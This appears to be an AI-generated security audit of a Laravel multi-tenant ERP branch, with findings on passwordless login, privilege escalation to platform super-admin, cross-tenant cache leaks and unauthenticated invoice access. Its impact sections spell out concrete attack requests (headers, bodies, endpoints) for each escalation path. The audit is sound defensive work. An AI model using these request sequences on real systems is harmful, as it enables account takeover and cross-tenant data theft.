# Security & access control — Score 2/10

> Branch `feature/multi-tenant` · 2026-10-07 · read-only multi-agent analysis · secrets redacted

## Executive summary

The feature/multi-tenant branch is not safe to sell as a multi-tenant SaaS. The sub-agents filed 9 findings; after deduplication there are 5 distinct critical issues, and every one survived adversarial verification against the code. Three separate paths give any user (or no user at all) platform super-admin or full tenant takeover. (1) POST /api/v1/auth/quick-login (routes/api.php:28, ApiQuickLoginAction.php:26-56) is public and unthrottled. It accepts a phone, email or numeric id with no password and returns a non-expiring '*' Sanctum token. GET /auth/workspace-users lists every user's id and phone to guests. The caller picks the tenant with the X-Tenant header, and on the central host the same call reaches the central super-admin. This code is new on this branch and is not on main. (2) Gate::before (AppServiceProvider.php:37-45) grants every ability, including super_admin.access, to anyone whose phone matches two hardcoded numbers. PUT /api/v1/profile lets any user, a cashier included, set their own phone to one of them, because the uniqueness check only runs inside their own tenant DB. (3) PermissionsSeeder creates the 'super_admin' role in every tenant DB. Store/UpdateUserRequest accept any existing role name, so every tenant admin can give themselves super_admin. All three paths lead to /api/v1/super-admin/*. That route group runs inside tenant context and is guarded only by can:super_admin.access. Its controller uses the central-connection Tenant model, so a tenant user can list, suspend, re-point DB credentials of and migrate every other tenant. Deletion is only blocked today because DeleteTenantAction.php does not parse. Two isolation breaks sit on top of this. (4) The cache is shared across tenants: CacheTenancyBootstrapper is disabled, the database cache store binds to the central connection at boot, and the analytics, P&L and Spatie permission cache keys carry no tenant id. One tenant's reports, and its role-to-permission mapping, can be served to another tenant. (5) The invoice print routes on tenant domains (routes/tenant.php:60-74) need no login and load invoices by sequential id, so anyone can harvest a tenant's customers and sales. The foundations are reasonable: Sanctum token hashing per tenant DB, FormRequest authorize() on most writes, 21 policies, a rate-limited password login, and a central-pinned CentralUser and Tenant. The problem is that platform authority is decided by attributes stored in the tenant DB (role name, phone), and the super-admin API is reachable from tenant context. That design flaw has to be fixed before any tenant is onboarded. The score is 2/10 because the building blocks exist, but the branch currently allows anonymous, full-platform compromise.

## Top risks
- CRITICAL – Passwordless login with no credentials: POST /api/v1/auth/quick-login (backend/routes/api.php:28; backend/app/Actions/Auth/ApiQuickLoginAction.php:26-56) sits outside ApiTokenAuth and has no throttle. It looks up `phone OR email OR id = login`, checks only is_active, and calls createToken(..., ['*']). Sanctum expiration is null (there is no config/sanctum.php). GET /auth/workspace-users (AuthController.php:93-110) gives guests every user's id and phone. ResolveApiTenancy.php:30 lets the caller choose the tenant through X-Tenant, ?tenant= or the body. Any account in any tenant, and the central super-admin, can be taken over without credentials. Introduced on this branch and absent from main.
- CRITICAL – Hardcoded phone allowlist grants god mode: Gate::before in backend/app/Providers/AppServiceProvider.php:37-45 returns true for any ability when the user's phone is one of two literal numbers. The same list appears in viewPulse (:49), TelescopeServiceProvider.php:82, routes/web.php:38, UserResource.php:19, ToggleTenantStatusRequest.php:13 and OverrideTenantFeatureRequest.php:13. PUT /api/v1/profile (UpdateProfileRequest authorize() = user() !== null, phone unique per tenant DB only; UpdateProfileAction.php:26) lets any cashier set that phone and become platform super-admin.
- CRITICAL – Tenant-seeded 'super_admin' role is self-assignable: TenantProvisionerService.php:85-87 runs PermissionsSeeder, and PermissionsSeeder.php:70-77 creates role super_admin with every permission in every tenant DB. StoreUserRequest.php:23 and UpdateUserRequest.php:54 validate only exists:roles,name. CreateUserAction and UpdateUserAction call syncRoles with no ceiling and no self-edit guard. Super_admin is hidden only in the UI dropdown (UserController.php:62). Every tenant owner can therefore escalate to platform super-admin. tests/Feature/Api/SuperAdminApiTest.php:62 encodes this model as correct.
- CRITICAL (root cause shared by the three above) – The platform API is reachable from tenant context: the super-admin route group (backend/routes/api.php:196-221) is inside the ResolveApiTenancy and ApiTokenAuth group, and its only guard is can:super_admin.access. SuperAdminApiController uses the central-connection Tenant model (toggleStatus :136, destroyTenant :247, updateDatabaseConfig :268), so a tenant-context caller can manage every tenant, rewrite tenant DB credentials and run migrations. UpdateTenantDatabaseConfigRequest.php:13 also authorizes the tenant-level 'admin' role directly.
- CRITICAL – Cross-tenant cache leak: CacheTenancyBootstrapper is commented out in config/tenancy.php:36. The database cache store (config/cache.php:18) is resolved at boot against the central connection. Keys have no tenant id: InventoryAnalyticsService.php:29 'erp_abc_{store}_{from}_{to}_{sort}', ProfitLossService.php:29 'erp_pnl_{store}_{from}_{to}', and the Spatie 'spatie.permission.cache' key (permission.php:209, 24h). Tenants receive each other's ABC and P&L data, and one tenant's role-permission matrix applies to every other tenant (UpdateRolePermissionsAction.php:26 resets the global key).
- CRITICAL – Anonymous invoice enumeration: GET /invoices/{id}/print, /print/thermal and /print/a4 in backend/routes/tenant.php:60-74 come before the auth group (line 77) and call Invoice::findOrFail($id) with no auth, permission, store check or throttle. The same routes exist in backend/routes/web.php:56-65 on the central host. Customer names and phones, line items and balances leak for every tenant whose subdomain is known.
- HIGH (reported in sub-agent notes; severity not separately re-verified) – Secrets and production data in the repo: the sub-agents report an SSH password and a webhook token on origin/main and erp-hub/main, and APP_KEY values in deploy_root_baraa.py:85, deploy_to_sroor_subdomain.py:54 and backend/phpunit.xml:22. Production SQL dumps and cost reports sit in local commit 76f32ce0, which has not been pushed. The central login and token fallbacks also auto-provision the platform owner into tenants (ApiLoginAction.php:38-58), and per the sub-agents the fallbacks let legacy central 'admin' users reach tenants.

## Quick wins
- Delete the quick-login route and ApiQuickLoginAction. Move /auth/workspace-users behind ApiTokenAuth, or remove it (backend/routes/api.php:28-29). Then revoke every personal_access_token whose name starts with 'quick-login-' and every token issued since that commit, in all tenant DBs and the central DB.
- Remove the hardcoded phone allowlist from AppServiceProvider.php:38 and :49, TelescopeServiceProvider.php:82, routes/web.php:38, UserResource.php:19, ToggleTenantStatusRequest.php:13 and OverrideTenantFeatureRequest.php:13.
- Add middleware to the /api/v1/super-admin group that aborts with 403 when tenancy()->initialized is true and resolves the user only through the central guard. That alone blocks all three escalation paths from tenant context.
- Reject 'super_admin' in StoreUserRequest and UpdateUserRequest (Rule::exists('roles','name')->whereNot('name','super_admin')) and stop PermissionsSeeder from creating that role and the super_admin.access permission in tenant DBs.
- Move the invoice print routes in routes/tenant.php:60-74 and routes/web.php:56-65 into the auth group with can:invoices.view plus a store-membership check, or switch them to short-lived URL::temporarySignedRoute links.
- Prefix the analytics and P&L cache keys with tenant('id') (InventoryAnalyticsService.php:29, ProfitLossService.php:29), and set the Spatie PermissionRegistrar cache key per tenant in a TenancyInitialized listener.
- Publish config/sanctum.php with a finite token expiration and add throttle middleware to every public auth and central route, including /central/tenants/resolve.
- Add regression feature tests: anonymous quick-login returns 401/404; a tenant admin assigning super_admin gets 422; a tenant-context call to /super-admin/* gets 403; a user changing their phone gains no abilities; an anonymous print URL redirects or returns 401; two tenants do not share report cache.
- Before pushing, drop commit 76f32ce0's dumps and reports from history, and rotate the SSH password, webhook token and any APP_KEY that is really used in production.

## Strategic items
- Redesign platform identity. Super-admin should be a CentralUser in the central DB only, authenticated on a central-only domain or route group with its own guard, and authorized by a central flag or role. It must never depend on a role name or a field (phone, email) that a tenant user can write.
- Enable Stancl's CacheTenancyBootstrapper with a taggable store (redis in production) so every Cache:: call is tenant-isolated by default, and add an architecture test that fails when a Cache::remember key lacks tenant scoping.
- Remove the central-DB fallbacks in login and token resolution (ApiLoginAction.php:38-58 and the ApiTokenAuth fallback). Then audit every production tenant DB, read-only and run by the owner, for users holding the super_admin role, users with allowlisted phones, and legacy central admins.
- If the POS needs fast cashier switching, rebuild it as a device-bound PIN unlock. It should require an existing valid device or session token and a hashed per-user PIN, be throttled, be scoped to a store, and issue short-lived tokens.
- Retire or lock down the duplicate session-based surface in web.php and tenant.php (exports, print, store/switch). Put the SPA, Android and Electron clients on a single authenticated API surface, and use signed URLs for anything a popup or printer has to open.
- Enforce subscription and tenant status (suspended or expired) in middleware on every tenant API request. The sub-agents say suspended tenants can still use the API.
- Add store-level authorization: a central StoreContext guard built on the StoreController::switchStore membership logic, plus store-aware policy rules, so a user cannot read or write other branches' data inside the same tenant.
- Clean up secrets and operations: move deploy credentials out of the repo into a secret store, purge the leaked values from git history on all remotes, rotate the APP_KEYs, retire the ad-hoc root scripts that touch production, and confirm that update_webhook.php is no longer deployed.
- Add a security CI gate: run the regression tests above, a route-list check that fails when a non-allowlisted route lacks auth or throttle, and secret scanning (gitleaks) on every push.

## Strengths
- Sanctum tokens are isolated per tenant on the normal path. PersonalAccessToken::findToken looks the id up in the current tenant DB and checks the sha256 hash with hash_equals, and ResolveApiTenancy runs before ApiTokenAuth, so a token from tenant A cannot authenticate in tenant B.
- The password login endpoints (ApiLoginRequest, LoginRequest) have per-identifier+IP rate limiting (6 and 5 attempts per 60s) and log failed attempts to the activity log.
- The permission model is broadly in place. Nearly every write endpoint uses a FormRequest whose authorize() checks a permission, there are 21 Policy classes, the activity-log endpoints are gated twice, and tenant.php wraps most web operations in auth plus fine-grained can: middleware.
- Gate::before already denies super_admin.* to non-super_admin users, including a plain tenant 'admin'. Once the phone allowlist and the tenant-seeded role are removed, that check works as intended.
- CentralUser, Tenant, Domain and ImpersonationToken pin the central connection. The super_admin and central guards use the central_users provider. ImpersonateTenantAction is not wired to any route, and stancl impersonation tokens are single-use with a 60s TTL.
- Mass assignment is handled carefully: no model uses $guarded = [], writes go through DTOs and explicit arrays, UpdateProfileAction cannot change role or is_active and requires the current password to change the password, and self-delete and self-deactivate are blocked.
- Approved invoices are never hard-deleted (cancel goes through invoices.cancel), and trash force-delete uses a strict type whitelist with onlyTrashed().
- Queries use bound parameters (no request-driven whereRaw or orderByRaw found), Blade print templates escape output, and the print paths aggregate money with bcmath.
- Setting cache keys already include tenant('id'), and the Filesystem and Queue tenancy bootstrappers are enabled, which shows the team knows the isolation pattern.
- Safe defaults: APP_DEBUG defaults to false, .env files are git-ignored, session cookies are http_only with same_site=lax, and Electron windows use contextIsolation:true and nodeIntegration:false with a contextBridge-only preload.

## Findings

### 1. [CRITICAL] Unauthenticated passwordless 'quick-login' issues a full-access token for any user in any tenant, and in the central DB
- **Location:** `D:\projects\sroor\backend\app\Actions\Auth\ApiQuickLoginAction.php:26`
- **Effort:** S
- **Evidence:** routes/api.php:28-29 registers POST /api/v1/auth/quick-login and GET /api/v1/auth/workspace-users outside the ApiTokenAuth group. Neither has throttle middleware. ApiQuickLoginAction::execute() looks up User where phone = login OR email = login OR id = login. It only checks is_active and then calls createToken($tokenName, ['*']). No password, PIN or device check happens anywhere. AuthController::workspaceUsers (AuthController.php:93-110) returns the id, name and phone/email of every active user to guests. ResolveApiTenancy.php:30 lets the caller pick the tenant DB with X-Tenant, ?tenant= or a body field. TenantProvisionerService.php:99-124 creates the tenant admin as the first user, so it gets id 1. LoginView.vue:304/331 and stores/auth.js:76 call these endpoints. Introduced on this branch: ApiQuickLoginAction does not exist on main.
- **Impact:** An anonymous attacker who knows a tenant slug (slugs are public subdomains, and /central/tenants/resolve confirms them) sends POST https://<central-host>/api/v1/auth/quick-login with header X-Tenant: <victim-slug> and body {"login":"1"}. The response is a never-expiring bearer token for the victim's admin. That gives full read/write over the victim's sales, customers, treasury and users. Without X-Tenant on the central host, the same request with login=[REDACTED_PHONE] (that phone is hardcoded in source) returns a token for the seeded central super-admin. That token passes can:super_admin.access, which opens tenant listing, deletion (DeleteTenantAction drops the DB), update-db-config and run-migrations. Result: full compromise of every tenant and the platform, with no credentials.
- **Recommendation:** Delete the quick-login route and action, or redesign it as a device-bound PIN unlock: it should require an existing valid token plus a per-user PIN hash and be throttled. Remove workspace-users from the guest group, or limit it to an already-authenticated device token and return only display names. Add a regression test asserting that POST /auth/quick-login without credentials returns 401/404.
- **Verification:** I confirmed this from the code and found no guard anywhere that stops it.

1. **Open routes.** routes/api.php:28-29 registers POST /auth/quick-login and GET /auth/workspace-users. They sit only inside the ResolveApiTenancy group, outside the ApiTokenAuth group.
2. **No throttling.** bootstrap/app.php adds no throttle or other global API middleware. A grep finds no RateLimiter or throttle setup for these routes. Only login() calls ensureIsNotRateLimited.
3. **No credential check.** AuthController::quickLogin (around lines 112-125) validates only that login is a string. ApiQuickLoginAction::execute (lines 26-56) finds the user by `phone = login OR email = login OR id = login`, checks only is_active, and returns `createToken($tokenName, ['*'])` plus the plaintext token. There is no password, PIN, device or IP check.
4. **User list leaks to guests.** AuthController::workspaceUsers (lines 93-110) returns id, name and phone or email for every active user, with no authentication.
5. **Caller picks the tenant.** ResolveApiTenancy.php:30 starts tenancy from the X-Tenant header, ?tenant= or a body field. When none is given on a central host, the query runs against the central users table.
6. **Hardcoded super-admin phones.** The phone list ['[REDACTED_PHONE]', '[REDACTED_PHONE]'] is hardcoded in AppServiceProvider.php:38 and :49 (super-admin gates), UserResource.php:19, ToggleTenantStatusRequest and OverrideTenantFeatureRequest. So a quick-login token for that phone holder in the central DB passes the gates behind the super-admin route group at routes/api.php:196, which uses can:super_admin.access.
7. **Tokens are accepted and don't expire.** ApiTokenAuth accepts the Sanctum token. There is no config/sanctum.php in backend/config, so Sanctum's default applies: no expiration.
8. **New on this branch.** `git log main` on ApiQuickLoginAction.php returns nothing, so the file is not on main.

**Minor overstatements.** Who holds id 1 in each tenant DB depends on the provisioner and seeders, which I did not check. It doesn't matter, because workspace-users hands any attacker the ids and logins anyway.

**Result.** An unauthenticated attacker can take over any account in any tenant, and the platform super-admin, with no credentials. The critical rating stands.

### 2. [CRITICAL] Gate::before grants every ability, including super_admin.access, to any user whose phone matches two hardcoded numbers, and users can set their own phone
- **Location:** `D:\projects\sroor\backend\app\Providers\AppServiceProvider.php:38`
- **Effort:** M
- **Evidence:** Gate::before returns true when $user->hasRole('super_admin') || in_array($user->phone, ['[REDACTED_PHONE]','[REDACTED_PHONE]']). The check runs against whatever User is authenticated, tenant users included. UpdateProfileRequest.php:23 only requires the phone to be unique in the current (tenant) DB, and authorize() is just user() !== null. UpdateProfileAction.php:26 then sets $user->phone = $validated['phone']. The super-admin group in routes/api.php:196-221 sits inside the same tenancy-resolving group and is gated only by can:super_admin.access. SuperAdminApiController works on Tenant, which uses the central connection through stancl's base model, so it operates on all tenants from tenant context.
- **Impact:** Any authenticated user in any tenant, including a cashier, sends PUT /api/v1/profile with X-Tenant: own-tenant and body {name, phone:"[REDACTED_PHONE]", theme_preference:"dark"}. From then on every can: check returns true. That includes GET/DELETE /api/v1/super-admin/tenants/{id}, POST /super-admin/tenants/{id}/update-db-config, plans and platform settings. One tenant can delete or re-point other tenants' databases. Note: the platform owner auto-provisioned into tenants by the central login fallback also gets this phone, so the bypass works for them in every tenant.
- **Recommendation:** Remove the phone allow-list from Gate::before, the viewPulse gate, the Telescope gate and routes/web.php:38. Grant platform access only to a pinned CentralUser, checked against the central DB, through a dedicated super_admin guard/middleware on a central-only route group (no tenancy initialized). Also block changes to identity fields used for authorization.
- **Verification:** I confirmed this in the code. AppServiceProvider.php:37-45 has a Gate::before that returns true for any authenticated user whose `phone` is one of two hardcoded numbers. The same phone allowlist appears in five other places: viewPulse (AppServiceProvider.php:49), web.php:38, TelescopeServiceProvider.php:82, ToggleTenantStatusRequest.php:13 and OverrideTenantFeatureRequest.php:13. UserResource.php:19 also reports is_super_admin based on it.

How an attacker gets the phone:
- PUT /api/v1/profile (api.php:183, also tenant.php:235) needs only ApiTokenAuth. There is no `can:` middleware on it.
- UpdateProfileRequest::authorize() only checks `user() !== null`. The phone rule is `Rule::unique('users','phone')->ignore($userId)`, and it resolves against the tenant DB.
- UpdateProfileAction.php:26 then assigns `$user->phone = $validated['phone']` and saves it, without re-verifying the phone or asking for the password.

How that phone reaches the super-admin routes:
- The super-admin routes (api.php:196-221) sit inside the ResolveApiTenancy + ApiTokenAuth group. Their only gate is `can:super_admin.access`, which the Gate::before above settles.
- SuperAdminApiController calls `Tenant::findOrFail($id)` on destroyTenant (:247) and updateDatabaseConfig (:268). Tenant extends stancl's BaseTenant, which uses the central connection, so these calls reach every tenant's record from inside any tenant's context.

The one limit I found: the unique rule blocks the change only when that exact phone already exists in the attacker's tenant DB. The platform owner gets copied into a tenant only lazily, by the login fallback in ApiLoginAction.php:38-58, which runs firstOrCreate by phone. The attacker needs just one of the two numbers to be free, and in most tenants at least one will be. So the limit does not reduce the impact.

The result: any tenant user, a cashier included, can make themselves platform super-admin. They can then delete other tenants, re-point their database config, run migrations, and change plans and platform settings. Rating: critical, confirmed.

### 3. [CRITICAL] Tenant admins (or anyone with users.manage/roles.manage) can give themselves the 'super_admin' role, which passes the platform gate
- **Location:** `D:\projects\sroor\backend\app\Http\Requests\StoreUserRequest.php:23`
- **Effort:** S
- **Evidence:** PermissionsSeeder.php:70 runs Role::firstOrCreate(['name' => 'super_admin']). The seeder is run inside every tenant DB by TenantProvisionerService.php:87. StoreUserRequest/UpdateUserRequest validate 'role' => ['required','string','exists:roles,name'] with no exclusion list. CreateUserAction.php:29 and UpdateUserAction.php:35 call syncRoles([$dto->role]). authorize() accepts hasRole('admin') || can('users.manage') || can('roles.manage'). UserController.php:62 hides super_admin from the dropdown only (UI-side). Gate::before (AppServiceProvider.php:38) returns true for hasRole('super_admin') before the super_admin.* deny branch.
- **Impact:** A tenant owner, or a store manager with users.manage, sends PUT /api/v1/users/{own id} with role=super_admin, or POSTs a new user with that role. They then call /api/v1/super-admin/* with X-Tenant: their tenant and get the platform panel: they can list, suspend or delete competitors' tenants and rewrite tenant DB credentials. The same works in central context for any central user with users.manage.
- **Recommendation:** Do not seed super_admin (or super_admin.access) into tenant DBs. Validate role with Rule::exists('roles','name')->whereNotIn('name',['super_admin']) and check server-side that the actor may grant the target role (no role above your own). Platform authorization must not rely on a role name that exists in tenant DBs.
- **Verification:** The code confirms this finding, and I found no guard anywhere along the path. (1) The tenant DB has a 'super_admin' role. TenantProvisionerService.php:85-87 runs PermissionsSeeder inside $tenant->run(), and PermissionsSeeder.php:70 runs Role::firstOrCreate(['name'=>'super_admin']). (2) StoreUserRequest.php:23 and UpdateUserRequest.php:54 only check 'exists:roles,name'. In tenant context that check runs against the tenant DB, so super_admin passes. authorize() accepts hasRole('admin'), can('users.manage') or can('roles.manage'). Gate::before also returns true for admin on any ability that is not super_admin.*. (3) CreateUserAction:29 and UpdateUserAction:69 call syncRoles([$dto->role]) with no filtering. UserController::update/store add no further checks. The only exclusion of super_admin is in the index() roles dropdown (UserController.php:62), which is UI-only. (4) In routes/api.php:196 the super-admin group is guarded only by 'can:super_admin.access'. Nothing restricts it to central context. ResolveApiTenancy initializes the tenant from the X-Tenant header for all non-/central routes. ApiTokenAuth resolves the user from the tenant DB. (5) AppServiceProvider.php:38 Gate::before returns true for hasRole('super_admin') before the super_admin.* deny branch, so a tenant-DB super_admin passes the gate. (6) SuperAdminApiController works on App\Models\Tenant, which extends the stancl base Tenant. That model uses the central connection, so destroy, toggle-status, update-db-config and run-migrations act on real central tenant records from inside a tenant request. Some endpoints that use Plan or Setting without the central connection may fail in tenant context, but the destructive tenant endpoints do not depend on them. One step deserves a narrower reading: escalating your own account needs users.manage, roles.manage or admin, and a tenant owner has admin by default. Every tenant owner of this SaaS can therefore take over the platform and suspend or delete other tenants. Critical is justified.

### 4. [CRITICAL] Cache is shared across tenants (CacheTenancyBootstrapper disabled): analytics results and the Spatie permission cache leak between tenants
- **Location:** `D:\projects\sroor\backend\app\Services\InventoryAnalyticsService.php:29`
- **Effort:** M
- **Evidence:** config/tenancy.php:36 has CacheTenancyBootstrapper commented out. The cache store is 'database' (config/cache.php:18) with connection null. The store is resolved at boot: AppServiceProvider::boot calls Gate::before, which resolves Gate, which triggers Spatie's callAfterResolving → PermissionRegistrar → cacheManager->store(). That happens before any tenant is initialized, so the cache table is the central one for every tenant. Keys have no tenant id: InventoryAnalyticsService.php:29 "erp_abc_{store}_{from}_{to}_{sort}" (used by GetInventoryValuationReportAction.php:99 → GET /api/v1/reports/inventory), ProfitLossService.php:29 "erp_pnl_{store}_{from}_{to}" (ReportPrintController.php:542), and config/permission.php:209 'spatie.permission.cache' (24h). By contrast, Setting::getCacheKey() (Setting.php:18-21) does include tenant('id'), which shows the authors knew the cache is shared.
- **Impact:** Tenant A's manager opens the inventory report for 2026-10-01..2026-10-07, store 1. Within 15 minutes tenant B requests the same range (default date ranges make this likely). B receives A's ABC analysis: item names, quantities and revenue. The same applies to P&L print. With the permission cache, whichever tenant rebuilds it first defines the permission → role-id mapping for all tenants for 24h. When tenant A edits its role matrix (UpdateRolePermissionsAction forgets the global key), permissions granted to A's roles apply to roles with the same ids in other tenants.
- **Recommendation:** Enable Stancl CacheTenancyBootstrapper with a taggable store (redis), or prefix every key with tenant('id'). Set the Spatie cache key per tenant (e.g. PermissionRegistrar cacheKey = 'spatie.permission.cache.'.tenant('id') in a TenancyInitialized listener, then call initializeCache()). Add a test that asserts two tenants do not share report cache entries.
- **Verification:** I could not refute this, and running the app confirmed it. config/tenancy.php:36 has CacheTenancyBootstrapper commented out. config/cache.php:18 makes 'database' the default store (CACHE_STORE=database in .env:41 and .env.example:41), with the connection set to env('DB_CACHE_CONNECTION'), which is null. In Laravel, CacheManager::createDatabaseDriver (vendor CacheManager.php:200) resolves the connection when the store is created. DatabaseStore then keeps that Connection object for its whole life (DatabaseStore.php:102), and the manager reuses the same store afterwards. The store gets created during boot. Spatie's PermissionServiceProvider::packageBooted registers a callAfterResolving(Gate) hook that builds PermissionRegistrar, and register_permission_check_method is true (permission.php:121). The PermissionRegistrar constructor calls cacheManager->store(). AppServiceProvider::boot calls Gate::before at line 37, which resolves Gate. I booted the app with `php artisan tinker` and checked the cache manager by reflection without writing anything. Right after boot, the stores array already holds ["database"], PermissionRegistrar and Gate are both resolved, and the store's connection name is the central default ('sqlite' locally). When stancl initializes a tenant, DatabaseManager::connectToTenant only purges and recreates the 'tenant' connection and switches the default to it. It never touches the cache manager. Nothing in TenancyServiceProvider or the middleware resets the cache either. So every tenant's Cache::* calls read and write the central cache table. The tenant migration database/migrations/tenant/0001_01_01_000001_create_cache_table.php exists but is never used for this. The keys have no tenant id: InventoryAnalyticsService.php:29 builds "erp_abc_{store}_{from}_{to}_{sort}", reached from GetInventoryValuationReportAction.php:99 and ReportPrintController.php:481. ProfitLossService.php:29 builds "erp_pnl_{store}_{from}_{to}", reached from ReportPrintController.php:541. Spatie uses the single 'spatie.permission.cache' key for 24h (permission.php:203, :209). By contrast, Setting.php:20 does put tenant('id') in its key. Store ids are auto-increment in each tenant DB, so store 1 and default date ranges will collide between tenants. That means one tenant can be served another tenant's item names, quantities, revenue and P&L, held for 15 minutes. Spatie checks a permission's roles against the user's role ids using the cached permission→role mapping. So the matrix of whichever tenant warmed the cache first is applied to every tenant's non-admin roles. UpdateRolePermissionsAction.php:26 forgets the global key, so one tenant can re-poison the cache for all of them. Two things limit the impact a little. Admin and super_admin users skip the check through Gate::before. A leak also needs the store id and date range to match within the TTL. It is still a real break of tenant isolation, both data confidentiality and authorization, so I am keeping the severity at critical.

### 5. [CRITICAL] Any tenant user can make themselves platform super-admin by changing their own phone to a hardcoded number
- **Location:** `D:\projects\sroor\backend\app\Providers\AppServiceProvider.php:38`
- **Effort:** M
- **Evidence:** Gate::before returns true for every ability, including 'super_admin.access', when `in_array($user->phone, ['[REDACTED_PHONE]','[REDACTED_PHONE]'])` (AppServiceProvider.php:38). PUT /api/v1/profile is open to every authenticated user: UpdateProfileRequest::authorize() is `return $this->user() !== null`, and the `phone` rule only requires it to be unique within the tenant's own users table (UpdateProfileRequest.php:22). UpdateProfileAction.php:26 writes `$user->phone = (string)$validated['phone']` with no restriction. ApiTokenAuth.php:73-80 sets the tenant-DB user as the auth user, so Gate::before evaluates the phone of a user who lives in the tenant DB. The same allowlist also appears in UserResource.php:19 (is_super_admin flag), TelescopeServiceProvider.php:82, routes/web.php:38, ToggleTenantStatusRequest.php:13 and OverrideTenantFeatureRequest.php:13.
- **Impact:** 1) A cashier in tenant A sends PUT /api/v1/profile with X-Tenant: A and body {name, phone:'[REDACTED_PHONE]', theme_preference:'dark'}. 2) They send DELETE /api/v1/super-admin/tenants/B with X-Tenant: A. The `can:super_admin.access` route gate passes through Gate::before. SuperAdminApiController::destroyTenant uses Tenant, which uses stancl's CentralConnection, so it deletes tenant B from the central DB, and TenancyServiceProvider.php:39-41 runs Jobs\DeleteDatabase, which drops B's database. The same caller can also list every tenant, toggle any tenant's status and plan features, run migrations on any tenant, and use POST /tenants/{id}/update-db-config to point another tenant's database at a host they control. Result: cross-tenant data loss or exfiltration across the whole platform, starting from the lowest-privilege account. The only precondition is that the phone number is not already used in tenant A. The Telescope and Pulse gates fall the same way, and Telescope also accepts any self-set email ending in @baraa-solutions.com.
- **Recommendation:** Remove every identity check based on phone or email (AppServiceProvider:38 and :49, UserResource:19, TelescopeServiceProvider:82-85, web.php:38-39, ToggleTenantStatusRequest, OverrideTenantFeatureRequest). Super-admin must be a property of a central-DB identity only, for example a CentralUser authenticated against the central connection with a central-only flag or role, checked while tenancy is not initialized. Add a test where a tenant user changes their phone to the old allowlisted value and gets 403 on /super-admin/*. Then rotate the sessions and tokens of the real operators.
- **Verification:** I confirmed the finding in the code, with one part of the impact that is overstated.

How the escalation works:
- **The bypass.** In AppServiceProvider.php:37-40, Gate::before returns true for any ability, including super_admin.*, when `in_array($user->phone, ['[REDACTED_PHONE]','[REDACTED_PHONE]'])`. The viewPulse gate at line 49 uses the same list.
- **Anyone can set that phone.** PUT /api/v1/profile (routes/api.php:183) sits only behind ResolveApiTenancy and ApiTokenAuth. It has no permission middleware.
- **The validation does not stop it.** UpdateProfileRequest::authorize() is just `return $this->user() !== null`. The phone rule only checks `Rule::unique('users','phone')->ignore($userId)` on the active connection, which is the tenant DB once X-Tenant is set.
- **The value is saved as sent.** UpdateProfileAction.php:26 writes `$user->phone = (string)$validated['phone']` unfiltered.
- **The tenant user is the one checked.** ResolveApiTenancy initializes the tenant from the X-Tenant header. ApiTokenAuth then resolves the user from the tenant DB and sets it with Auth::setUser, so Gate::before reads the attacker's self-chosen phone.
- **The super-admin routes are open to them.** These routes (routes/api.php:196-220) live in the same group, gated only by `can:super_admin.access`. I found no other guard.
- **The controller acts on all tenants.** SuperAdminApiController uses App\Models\Tenant. That model extends the stancl base Tenant, which uses Concerns\CentralConnection, so it reads and writes the central tenant table for every tenant.
- **The same allowlist appears elsewhere.** I confirmed it in UserResource.php:19, TelescopeServiceProvider.php:82, routes/web.php:38, ToggleTenantStatusRequest.php:13 and OverrideTenantFeatureRequest.php:13.

What is overstated:
- **DELETE /super-admin/tenants/{id} cannot drop another tenant's database right now.** backend/app/Actions/Tenants/DeleteTenantAction.php is broken in the committed HEAD. `php -l` reports a parse error at line 12: the `$tenant` variables are missing, as in `execute(Tenant ): void`. Resolving the action therefore fails before the DeleteDatabase job can run.

What still works for a cashier who sets the phone:
- List and show every tenant.
- Create tenants.
- Toggle any tenant's status, override its features and update its units.
- Run tenants:migrate on any tenant.
- Edit plans, platform settings and app versions.
- Change another tenant's DB connection config through POST /tenants/{id}/update-db-config, which enables data redirection or exfiltration.
- Open the Pulse and Telescope dashboards.

The only precondition is that the phone is not already used inside the attacker's own tenant DB. That makes this lowest-privilege-to-platform-owner escalation, and the severity stays critical even without the delete path.

A separate issue: UpdateTenantDatabaseConfigRequest.php:13 also authorizes any user with the tenant-level 'admin' role, even without the phone trick.

### 6. [CRITICAL] The 'super_admin' role is seeded into every tenant database and can be assigned by any tenant admin, giving platform super-admin
- **Location:** `D:\projects\sroor\backend\app\Http\Requests\StoreUserRequest.php:23`
- **Effort:** M
- **Evidence:** Tenant provisioning runs PermissionsSeeder inside the new tenant DB (TenantProvisionerService.php:87). That seeder does `Role::firstOrCreate(['name' => 'super_admin'])` and syncs all permissions to it (PermissionsSeeder.php:70-77). The Gate::before short-circuit is `$user->hasRole('super_admin')` (AppServiceProvider.php:38), and it is evaluated against the tenant-DB user. StoreUserRequest and UpdateUserRequest validate `'role' => ['required','string','exists:roles,name']`, which accepts 'super_admin'. CreateUserAction/UpdateUserAction call `$user->syncRoles([$dto->role])`. Neither hides super_admin: UserController.php:62 and GetRolesMatrixAction.php:21 hide it only from the dropdown lists. UpdateUserAction has no self-edit guard. tests/Feature/Api/SuperAdminApiTest.php:62 assigns super_admin in the same DB, so the test suite treats this vulnerable model as correct.
- **Impact:** A tenant admin, or any user holding roles.manage, sends PUT /api/v1/users/{own id} with X-Tenant: A and role=super_admin, or creates a new user with that role. That user then passes `can:super_admin.access` and can delete or disable other tenants, drop their databases, rewrite their DB credentials, change plans and pricing, and manage the APK releases pushed to every customer's devices. Every paying customer becomes a potential platform owner.
- **Recommendation:** Do not create 'super_admin' (or the 'super_admin.access' permission) in tenant DBs: split PermissionsSeeder into a central part and a tenant part, and delete the role and permission from existing tenant DBs in a tenant migration. Add a server-side role whitelist to Store/UpdateUserRequest, e.g. `Rule::in(Role::where('name','!=','super_admin')->pluck('name'))`. Gate super-admin routes with a central-only middleware that checks `!tenancy()->initialized` and a central guard, not a spatie role resolved on the tenant connection. Add a regression test where a tenant admin assigns super_admin and gets 422, and a tenant-context call to /super-admin gets 403.
- **Verification:** I confirmed this from the code and found no guard that stops it.

1. The role exists in every tenant. TenantProvisionerService.php:85-87 runs `PermissionsSeeder` inside `$tenant->run()`. PermissionsSeeder.php:62 creates the `super_admin.access` permission. Lines 70 and 77 create the `super_admin` role and give it every permission, all in the tenant DB.

2. A tenant admin can assign it. StoreUserRequest.php:23 and UpdateUserRequest.php both validate `'role' => ['required','string','exists:roles,name']`, which accepts `super_admin`. Both `authorize()` methods pass for `hasRole('admin')`, `users.manage` or `roles.manage`. CreateUserAction and UpdateUserAction call `$user->syncRoles([$dto->role])` with no filter. UpdateUserAction has no self-edit or privilege-ceiling check. UserController.php:62 removes super_admin only from the dropdown list in `index()`.

